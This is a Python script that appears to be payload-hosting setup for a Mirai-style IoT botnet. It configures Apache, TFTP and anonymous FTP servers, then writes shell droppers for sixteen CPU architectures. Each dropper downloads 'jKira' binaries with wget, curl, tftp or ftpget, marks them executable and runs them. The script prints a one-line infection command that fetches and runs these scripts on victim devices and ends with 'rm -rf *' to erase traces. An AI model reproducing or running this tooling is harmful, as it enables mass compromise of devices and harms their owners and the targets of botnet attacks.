import subprocess, sys, urllib
ip = urllib.urlopen('http://api.ipify.org').read()

exec_bin = "jKira19x7"
bin_prefix = "jKira."
bin_directory = "bins"

archs = [
"x86",                        #1
"mips",                       #2
"mpsl",                       #4
"arm",                        #5
"arm5",                       #6
"arm6",                       #7
"arm7",                       #9
"ppc",                        #10
"m68k",                       #12
"sh4",                        #13
"spc",                        #14
"arc",     #15
"x86_64",                   #16
"i686",                        #17
"i486",           #18
"mips64"                    #19
]                        

def run(cmd):
    subprocess.call(cmd, shell=True)

print("Setting up Apache2 TFTP and FTP for your payload")
print(" ")

run("sudo apt-get install apache -y")
run("sudo service apache2 start")
run("sudo apt-get install xinetd tftp tftp-hpa -y")
run("sudo apt-get install vsftpd -y")
run("sudo service vsftpd restart")

run('''echo "service tftp
{
	socket_type             = dgram
	protocol                = udp
	wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')	
run("service xinetd start")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd-anon.conf''')
run("service vsftpd restart")
run("service xinetd restart")
print("Creating .sh Bins")
print(" ")
run('echo "#!/bin/bash" > /var/lib/tftpboot/jKiratf1.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/jKiratf1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/jKiratf1.sh')
run('echo "#!/bin/bash" > /var/lib/tftpboot/jKiratf2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/jKiratf2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/jKiratf2.sh')
run('echo "#!/bin/bash" > /var/www/html/8UsA.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/jKiratf2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/jKiratf2.sh')
run('echo "#!/bin/bash" > /var/ftp/8UsA1.sh')
run('echo "ulimit -n 1024" >> /var/ftp/8UsA1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/8UsA1.sh')
for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/www/html/jKira19x7.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/ftp/jKiratf1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/lib/tftpboot/jKira19x7.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + ';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/lib/tftpboot/jKiratf2.sh')    
run("service xinetd restart &> /dev/null")
run("service apache2 restart &> /dev/null")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')

print("\x1b[0;32mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/jKira19x7.sh; curl -O http://" + ip + "/jKira19x7.sh; chmod 777 jKira19x7.sh; sh jKira19x7.sh; tftp " + ip + " -c get jKira19x7.sh; chmod 777 jKira19x7.sh; sh jKira19x7.sh; tftp -r jKiratf2.sh -g " + ip + "; chmod 777 jKiratf2.sh; sh jKiratf2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " jKiratf1.sh jKiratf1.sh; sh jKiratf1.sh; rm -rf jKira19x7.sh jKira19x7.sh jKiratf2.sh jKiratf1.sh; rm -rf *\x1b[0m")

print("Copied to /var/www/html/bins.sh")
killme = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/jKira19x7.sh; curl -O http://" + ip + "/jKira19x7.sh; chmod 777 jKira19x7.sh; sh jKira19x7.sh; tftp " + ip + " -c get jKira19x7.sh; chmod 777 jKira19x7.sh; sh jKira19x7.sh; tftp -r jKiratf2.sh -g " + ip + "; chmod 777 jKiratf2.sh; sh jKiratf2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " jKiratf1.sh jKiratf1.sh; sh jKiratf1.sh; rm -rf jKira19x7.sh jKira19x7.sh jKiratf2.sh jKiratf1.sh; rm -rf *"
run('echo "'+killme+'" >> /var/www/html/bins.sh')
print("")
raw_input("press any key to exit....")
